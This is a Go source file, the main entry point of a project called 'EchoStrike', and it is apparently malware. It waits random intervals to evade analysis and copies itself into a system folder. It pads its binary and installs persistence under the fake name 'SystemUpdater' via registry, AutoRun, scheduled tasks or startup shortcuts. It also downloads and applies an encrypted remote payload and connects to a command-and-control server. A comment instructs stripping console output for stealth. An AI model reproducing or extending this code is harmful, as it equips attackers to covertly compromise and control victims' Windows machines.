package main

import (
	"fmt"
	"math/rand"
	"os"
	"strconv"
	"time"

	"EchoStrike/modules/config"
	"EchoStrike/modules/diagnostics"
	"EchoStrike/modules/integration"
	"EchoStrike/modules/network"
	"EchoStrike/modules/security"
	sysutils "EchoStrike/modules/utils"
	optimizer "EchoStrike/modules/variableoptimizer"
)

func main() {
	appConfig, err := config.LoadConfig()
	if err != nil {
		sysutils.LogErrorToFile(fmt.Sprintf("Could not load configuration: %s", err))
		return
	}

	time.Sleep(time.Duration(5+rand.Intn(5)) * time.Second)
	diagnostics.PerformDiagnostics()

	executablePath, err := os.Executable()
	if err != nil {
		sysutils.LogErrorToFile(fmt.Sprintf("Could not get executable path: %s", err))
		return
	}

	if appConfig.PersistenceOption != "0" {
		destPath, err := sysutils.MoveToSysDir(executablePath, appConfig.PersistenceOption)
		if err != nil {
			sysutils.LogErrorToFile(fmt.Sprintf("Could not move the file: %s", err))
			return
		}

		if appConfig.TargetSize > 0 {
			err = optimizer.AddPaddingToFile(destPath, appConfig.TargetSize)
			if err != nil {
				sysutils.LogErrorToFile(fmt.Sprintf("Could not apply padding to binary: %s", err))
			}
		}

		err = setupPersistence(destPath, appConfig.PersistenceOption)
		if err != nil {
			sysutils.LogErrorToFile(fmt.Sprintf("Could not establish auto-start: %s", err))
		}
	}

	if appConfig.URL != "" {
		handleUpdate(appConfig.URL, appConfig.Method)
	}

	if appConfig.ServerAddress != "" && appConfig.ServerPort != "" {
		connectToServer(appConfig.ServerAddress, appConfig.ServerPort, appConfig.ApiKey)
	}

	// Eliminar todas las salidas a consola como fmt.Println(...)
}

func setupPersistence(destPath, persistenceOption string) error {
	switch persistenceOption {
	case "1":
		return sysutils.SetupAutoStartRegistry("SystemUpdater", destPath, persistenceOption)
	case "2":
		return sysutils.ConfigureCmdAutoRun("SystemUpdater", destPath, persistenceOption)
	case "3":
		return sysutils.SetupScheduledTask("SystemUpdaterTask", destPath, persistenceOption)
	case "4":
		return sysutils.CreateStartupShortcut(destPath, persistenceOption)
	default:
		return sysutils.SetupAutoStartRegistry("SystemUpdater", destPath, persistenceOption)
	}
}

func handleUpdate(url, method string) {
	packageData, key, err := integration.FetchUpdatePackage(url)
	if err != nil {
		sysutils.LogErrorToFile(fmt.Sprintf("Could not fetch update package: %s", err))
		return
	}

	time.Sleep(time.Duration(2+rand.Intn(4)) * time.Second)

	if method == "1" {
		err = integration.ApplySystemUpdate(packageData, key)
		if err != nil {
			sysutils.LogErrorToFile(fmt.Sprintf("Could not apply system update: %s", err))
		}
	}
}

func connectToServer(serverAddress, serverPort, apiKey string) {
	securedAddress, err := security.ProcessDataGCM(serverAddress, apiKey, "encrypt")
	if err != nil {
		sysutils.LogErrorToFile(fmt.Sprintf("Could not secure server address: %s", err))
		return
	}

	securedPort, err := security.ProcessDataGCM(serverPort, apiKey, "encrypt")
	if err != nil {
		sysutils.LogErrorToFile(fmt.Sprintf("Could not secure server port: %s", err))
		return
	}

	decryptedAddress, err := security.ProcessDataGCM(securedAddress, apiKey, "decrypt")
	if err != nil {
		sysutils.LogErrorToFile(fmt.Sprintf("Could not decrypt server address: %s", err))
		return
	}

	decryptedPort, err := security.ProcessDataGCM(securedPort, apiKey, "decrypt")
	if err != nil {
		sysutils.LogErrorToFile(fmt.Sprintf("Could not decrypt server port: %s", err))
		return
	}

	port, err := strconv.Atoi(decryptedPort)
	if err != nil {
		sysutils.LogErrorToFile(fmt.Sprintf("Invalid port number: %s", err))
		return
	}

	time.Sleep(time.Duration(2+rand.Intn(4)) * time.Second)
	err = network.InitializeConnection(decryptedAddress, port)
	if err != nil {
		sysutils.LogErrorToFile(fmt.Sprintf("Could not establish connection: %s", err))
	}
}
